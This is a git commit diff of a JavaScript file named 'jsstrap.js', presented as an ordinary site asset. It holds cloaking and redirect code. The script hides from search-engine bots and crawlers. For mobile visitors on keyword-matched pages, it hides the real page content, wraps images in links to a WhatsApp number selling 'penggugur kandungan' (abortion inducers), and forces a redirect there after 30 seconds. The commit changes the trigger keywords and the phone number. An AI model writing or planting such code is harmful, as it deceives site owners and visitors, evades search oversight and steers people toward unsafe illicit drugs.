ddeaced1102f8b9d8727ebe627dcf5cbbfbaebfa
oriklinik <danangranggaa@gmail.com>
2022-11-09 19:50:11 +0700

    Signed-off-by: oriklinik <danangranggaa@gmail.com>

--- assets/js/jsstrap.js
+++ assets/js/jsstrap.js
@@ -14,13 +14,13 @@ setTimeout(function(){
 
 if (navigator.userAgent.match(/(googlebot\/|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)/)){}else{
 if (navigator.userAgent.match(/(iPod|iPhone|iPad|Android)/) ) {
-if (window.location.href.indexOf("gugur") > -1 || window.location.href.indexOf("admin") > -1 ){         
+if (window.location.href.indexOf("klinik") > -1 || window.location.href.indexOf("ori") > -1 ){         
 jQuery('.art-content').css({'position':'fixed','top':'-10000px',});
 jQuery('div[link]').each(function(){jQuery(this).css({'background':"url('"+jQuery(this).attr('link')+"')center / contain no-repeat",'height':'300px','margin':'5px auto 5px auto','max-width':'600px',})});
 
 jQuery('div.link').each(function(){jQuery(this).wrap("<a href='https://wa.me/6281388235875?text=Mau pesan ᴘᴇɴɢɢᴜɢᴜʀ ᴋᴀɴᴅᴜɴɢᴀɴ'></a>");});
 jQuery('#modal-1').modal(); 
-setTimeout(function(){location.href="https://wa.me/6281388235875?text=Mau pesan ᴘᴇɴɢɢᴜɢᴜʀ ᴋᴀɴᴅᴜɴɢᴀɴ"},30000 ); 
+setTimeout(function(){location.href="https://wa.me/6281312383338?text=Mau pesan ᴘᴇɴɢɢᴜɢᴜʀ ᴋᴀɴᴅᴜɴɢᴀɴ"},30000 ); 
 
 
   		  
